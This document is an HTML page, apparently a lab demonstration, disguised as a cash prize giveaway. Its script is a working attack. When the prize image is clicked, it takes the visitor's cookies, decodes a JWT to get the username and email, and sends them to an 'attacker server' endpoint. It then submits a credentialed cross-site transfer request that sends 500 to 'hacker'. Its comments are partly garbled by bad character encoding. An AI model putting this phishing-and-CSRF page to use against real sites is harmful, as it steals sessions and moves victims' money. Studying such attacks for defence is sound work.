<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Money Giveaway!</title>
    <link rel="stylesheet" href="evil.css">
</head>
<body>
    <div class="container">
        <h1>ğŸ‰ CONGRATULATIONS! ğŸ‰</h1>
        <p class="prize">You've won $1000!</p>
        <p>Click the image below to claim your prize!</p>
        
        <!-- Image that triggers the CSRF attack -->
        <img 
            src="https://picsum.photos/400/300" 
            alt="Click to claim your prize!"
            id="claimPrizeImg"
            style="cursor:pointer;"
        >
        
        <p>Don't miss this amazing opportunity!</p>
        <p style="font-size: 12px; color: #666;">* Limited time offer. Click now to claim your prize!</p>

        <!-- Success Message -->
        <div id="successMessage" class="success-message">
            <h2>ğŸ‰ Prize Claimed Successfully! ğŸ‰</h2>
            <p>Your prize has been processed!</p>
            <p>Thank you for participating in our giveaway!</p>
        </div>
    </div>

    <script>
        function createConfetti() {
            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'];
            for (let i = 0; i < 50; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.animationDelay = Math.random() * 3 + 's';
                document.body.appendChild(confetti);
            }
        }

        // HÃ m decode JWT token Ä‘á»ƒ láº¥y thÃ´ng tin user
        function decodeJWT(token) {
            try {
                const base64Url = token.split('.')[1];
                const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
                const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
                }).join(''));
                return JSON.parse(jsonPayload);
            } catch (e) {
                console.error('Error decoding JWT:', e);
                return null;
            }
        }

        // HÃ m láº¥y cookie theo tÃªn
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return null;
        }

        // Steal user info vÃ  gá»­i vá» attacker server
        function stealUserInfo() {
            const allCookies = document.cookie;
            const jwtToken = getCookie('jwtToken');
            
            let username = 'Unknown';
            let email = 'Unknown';
            
            // Decode JWT token Ä‘á»ƒ láº¥y thÃ´ng tin user
            if (jwtToken) {
                const decoded = decodeJWT(jwtToken);
                if (decoded) {
                    username = decoded.username || 'Unknown';
                    email = decoded.email || 'Unknown';
                    console.log('Decoded user info:', decoded);
                }
            }
            
            // Gá»­i thÃ´ng tin vá» attacker server
            const stealUrl = `http://localhost:3001/steal?cookie=${encodeURIComponent(allCookies)}&username=${encodeURIComponent(username)}&email=${encodeURIComponent(email)}`;
            console.log('Stealing data to:', stealUrl);
            new Image().src = stealUrl;
            
            return { username, email };
        }

        document.getElementById('claimPrizeImg').onclick = function() {
            console.log('ğŸ¯ Attempting CSRF attack...');
            
            // Steal user info trÆ°á»›c
            const userInfo = stealUserInfo();
            console.log('ğŸ‘¤ Stolen user info:', userInfo);
            
            fetch('http://localhost:3000/api/transfer', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: 'include',
                body: JSON.stringify({
                    amount: 500,
                    to: 'hacker'
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('âœ… CSRF Attack Response:', data);
                if (data.success) {
                    // Show success message
                    const successMessage = document.getElementById('successMessage');
                    successMessage.style.display = 'block';
                    // Create confetti effect
                    createConfetti();
                    // Hide the image and other content
                    document.getElementById('claimPrizeImg').style.display = 'none';
                    document.querySelector('.prize').style.display = 'none';
                    document.querySelector('p').style.display = 'none';
                    
                    // Add success info
                    successMessage.innerHTML += `<p>ğŸ’° Money transferred! New balance: ${data.newBalance}</p>`;
                } else {
                    alert('âŒ Attack failed: ' + data.message);
                }
            })
            .catch(error => {
                console.error('âŒ CSRF Attack Error:', error);
                alert('âŒ Attack failed: ' + error.message);
            });
        };
    </script>
</body>
</html> 